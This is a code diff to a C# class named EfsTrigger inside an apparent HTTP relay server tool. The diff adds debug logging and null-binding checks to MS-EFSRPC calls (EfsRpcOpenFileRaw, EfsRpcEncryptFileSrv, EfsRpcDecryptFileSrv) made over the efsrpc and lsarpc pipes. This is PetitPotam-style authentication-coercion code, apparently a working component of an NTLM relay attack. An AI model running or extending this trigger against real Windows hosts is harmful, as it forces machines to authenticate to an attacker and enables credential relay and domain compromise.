@@ -28,12 +28,20 @@ namespace Httprelayserver.EfsTrigger
         [SecurityPermission(SecurityAction.LinkDemand, Flags = SecurityPermissionFlag.UnmanagedCode)]
         public Efs(bool useEfsrpcPipe)
         {
+            Console.WriteLine($"[DEBUG][Efs] Constructor called with useEfsrpcPipe={useEfsrpcPipe}");
+            Console.WriteLine($"[DEBUG][Efs] IsWindows11_22H2OrLater() => {IsWindows11_22H2OrLater()}");
+            Console.WriteLine($"[DEBUG][Efs] Environment.OSVersion.Version = {Environment.OSVersion.Version}");
+            Console.WriteLine($"[DEBUG][Efs] nint.Size = {nint.Size} ({(nint.Size == 8 ? "x64" : "x86")})");
+
             if (useEfsrpcPipe)
             {
                 // Windows 11 22H2+ : use \pipe\efsrpc with different UUID
                 interfaceId = new Guid("df1941c5-fe89-4e79-bf10-463657acf44d");
                 _pipeName = "\\pipe\\efsrpc";
                 Console.WriteLine("[*] Using \\pipe\\efsrpc (Windows 11 22H2+ mode)");
+                Console.WriteLine($"[DEBUG][Efs] Interface UUID: {interfaceId}");
+                Console.WriteLine($"[DEBUG][Efs] Pipe: {_pipeName}");
+                Console.WriteLine($"[DEBUG][Efs] Pipe passed to InitializeStub: {_pipeName}");
                 if (nint.Size == 8)
                 {
                     InitializeStub(interfaceId, MIDL_ProcFormatStringx64, MIDL_TypeFormatStringx64, null, 1, 0);
@@ -49,6 +57,8 @@ namespace Httprelayserver.EfsTrigger
                 interfaceId = new Guid("c681d488-d850-11d0-8c52-00c04fd90f7e");
                 _pipeName = "\\pipe\\lsarpc";
                 Console.WriteLine("[*] Using \\pipe\\lsarpc (legacy mode)");
+                Console.WriteLine($"[DEBUG][Efs] Interface UUID: {interfaceId}");
+                Console.WriteLine($"[DEBUG][Efs] Pipe: {_pipeName}");
                 if (nint.Size == 8)
                 {
                     InitializeStub(interfaceId, MIDL_ProcFormatStringx64, MIDL_TypeFormatStringx64, _pipeName, 1, 0);
@@ -58,6 +68,7 @@ namespace Httprelayserver.EfsTrigger
                     InitializeStub(interfaceId, MIDL_ProcFormatStringx86, MIDL_TypeFormatStringx86, _pipeName, 1, 0);
                 }
             }
+            Console.WriteLine("[DEBUG][Efs] Stub initialized successfully");
         }
         
 
@@ -87,15 +98,20 @@ namespace Httprelayserver.EfsTrigger
         //Function calls
         public int EfsRpcOpenFileRaw(string computername, out nint hContext, string FileName, int Flags)
         {
+            Console.WriteLine($"[DEBUG][Efs] EfsRpcOpenFileRaw(computername={computername}, FileName={FileName}, Flags={Flags})");
             nint result = nint.Zero;
             nint pfn = Marshal.StringToHGlobalUni(FileName);
 
             hContext = nint.Zero;
             try
             {
+                Console.WriteLine($"[DEBUG][Efs] Creating RPC binding to {computername}...");
                 if (nint.Size == 8)
                 {
-                    result = NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(0), Bind(Marshal.StringToHGlobalUni(computername), interfaceid: interfaceId.ToString()), out hContext, FileName, Flags);
+                    var binding = Bind(Marshal.StringToHGlobalUni(computername), interfaceid: interfaceId.ToString());
+                    Console.WriteLine($"[DEBUG][Efs] Binding handle: 0x{binding:x}");
+                    if (binding == nint.Zero) { Console.WriteLine("[DEBUG][Efs] Binding FAILED - got null handle"); return -1; }
+                    result = NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(0), binding, out hContext, FileName, Flags);
                 }
                 else
                 {
@@ -115,46 +131,70 @@ namespace Httprelayserver.EfsTrigger
                     }
                 }
             }
-            catch (SEHException)
+            catch (SEHException ex)
             {
                 int err = Marshal.GetExceptionCode();
+                Console.WriteLine($"[DEBUG][Efs] EfsRpcOpenFileRaw SEHException: code={err} (0x{err:x8}), message={ex.Message}");
                 Console.WriteLine("[x]EfsRpcOpenFileRaw failed: " + err);
                 return err;
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[DEBUG][Efs] EfsRpcOpenFileRaw unexpected exception: {ex.GetType().Name}: {ex.Message}");
+                Console.WriteLine($"[DEBUG][Efs] HRESULT: 0x{ex.HResult:x8}");
+                throw;
             }
             finally
             {
                 if (pfn != nint.Zero)
                     Marshal.FreeHGlobal(pfn);
             }
+            Console.WriteLine($"[DEBUG][Efs] EfsRpcOpenFileRaw result: {(int)result.ToInt64()} (0x{(int)result.ToInt64():x8})");
             return (int)result.ToInt64();
         }
 
         public int EfsRpcEncryptFileSrv(string computername, string FileName)
         {
+            Console.WriteLine($"[DEBUG][Efs] EfsRpcEncryptFileSrv(computername={computername}, FileName={FileName})");
             nint result = nint.Zero;
             nint pfn = Marshal.StringToHGlobalUni(FileName);
             try
             {
+                Console.WriteLine($"[DEBUG][Efs] Creating RPC binding to {computername}...");
                 if (nint.Size == 8)
                 {
-                    result = NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(192), Bind(Marshal.StringToHGlobalUni(computername), interfaceid: interfaceId.ToString()), FileName);
+                    var binding = Bind(Marshal.StringToHGlobalUni(computername), interfaceid: interfaceId.ToString());
+                    Console.WriteLine($"[DEBUG][Efs] Binding handle: 0x{binding:x}");
+                    if (binding == nint.Zero) { Console.WriteLine("[DEBUG][Efs] Binding FAILED - got null handle"); return -1; }
+                    Console.WriteLine($"[DEBUG][Efs] Calling NdrClientCall2x64 with ProcStringOffset=192");
+                    result = NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(192), binding, FileName);
                 }
                 else
                 {
                     try
                     {
-                        result = CallNdrClientCall2x86(184, Bind(Marshal.StringToHGlobalUni(computername), interfaceid: interfaceId.ToString()), pfn);
+                        var binding = Bind(Marshal.StringToHGlobalUni(computername), interfaceid: interfaceId.ToString());
+                        Console.WriteLine($"[DEBUG][Efs] Binding handle (x86): 0x{binding:x}");
+                        if (binding == nint.Zero) { Console.WriteLine("[DEBUG][Efs] Binding FAILED - got null handle"); return -1; }
+                        result = CallNdrClientCall2x86(184, binding, pfn);
                     }
                     finally
                     {
                     }
                 }
             }
-            catch (SEHException)
+            catch (SEHException ex)
             {
                 int err = Marshal.GetExceptionCode();
+                Console.WriteLine($"[DEBUG][Efs] EfsRpcEncryptFileSrv SEHException: code={err} (0x{err:x8}), message={ex.Message}");
                 Console.WriteLine("[x]EfsRpcEncryptFileSrv failed: " + err);
                 return err;
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[DEBUG][Efs] EfsRpcEncryptFileSrv unexpected exception: {ex.GetType().Name}: {ex.Message}");
+                Console.WriteLine($"[DEBUG][Efs] HRESULT: 0x{ex.HResult:x8}");
+                throw;
             }
             finally
             {
@@ -166,14 +206,20 @@ namespace Httprelayserver.EfsTrigger
 
         public int EfsRpcDecryptFileSrv(string computername, string FileName, ulong Flags)
         {
+            Console.WriteLine($"[DEBUG][Efs] EfsRpcDecryptFileSrv(computername={computername}, FileName={FileName}, Flags={Flags})");
             nint result = nint.Zero;
             nint pfn = Marshal.StringToHGlobalUni(FileName);
 
             try
             {
+                Console.WriteLine($"[DEBUG][Efs] Creating RPC binding to {computername}...");
                 if (nint.Size == 8)
                 {
-                    result = NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(234), Bind(Marshal.StringToHGlobalUni(computername), interfaceid: interfaceId.ToString()), FileName, Flags);
+                    var binding = Bind(Marshal.StringToHGlobalUni(computername), interfaceid: interfaceId.ToString());
+                    Console.WriteLine($"[DEBUG][Efs] Binding handle: 0x{binding:x}");
+                    if (binding == nint.Zero) { Console.WriteLine("[DEBUG][Efs] Binding FAILED - got null handle"); return -1; }
+                    Console.WriteLine($"[DEBUG][Efs] Calling NdrClientCall2x64 with ProcStringOffset=234");
+                    result = NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(234), binding, FileName, Flags);
                 }
                 else
                 {
@@ -182,24 +228,35 @@ namespace Httprelayserver.EfsTrigger
                     nint tempValuePointer = handle.AddrOfPinnedObject();
                     try
                     {
-                        result = CallNdrClientCall2x86(224, Bind(Marshal.StringToHGlobalUni(computername), interfaceid: interfaceId.ToString()), tempValuePointer, pfn, nint.Zero);
+                        var binding = Bind(Marshal.StringToHGlobalUni(computername), interfaceid: interfaceId.ToString());
+                        Console.WriteLine($"[DEBUG][Efs] Binding handle (x86): 0x{binding:x}");
+                        if (binding == nint.Zero) { Console.WriteLine("[DEBUG][Efs] Binding FAILED - got null handle"); return -1; }
+                        result = CallNdrClientCall2x86(224, binding, tempValuePointer, pfn, nint.Zero);
                     }
                     finally
                     {
                     }
                 }
             }
-            catch (SEHException)
+            catch (SEHException ex)
             {
                 int err = Marshal.GetExceptionCode();
+                Console.WriteLine($"[DEBUG][Efs] EfsRpcDecryptFileSrv SEHException: code={err} (0x{err:x8}), message={ex.Message}");
                 Console.WriteLine("[x]EfsRpcDecryptFileSrv failed: " + err);
                 return err;
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[DEBUG][Efs] EfsRpcDecryptFileSrv unexpected exception: {ex.GetType().Name}: {ex.Message}");
+                Console.WriteLine($"[DEBUG][Efs] HRESULT: 0x{ex.HResult:x8}");
+                throw;
             }
             finally
             {
                 if (pfn != nint.Zero)
                     Marshal.FreeHGlobal(pfn);
             }
+            Console.WriteLine($"[DEBUG][Efs] EfsRpcDecryptFileSrv result: {(int)result.ToInt64()} (0x{(int)result.ToInt64():x8})");
             return (int)result.ToInt64();
         }
 
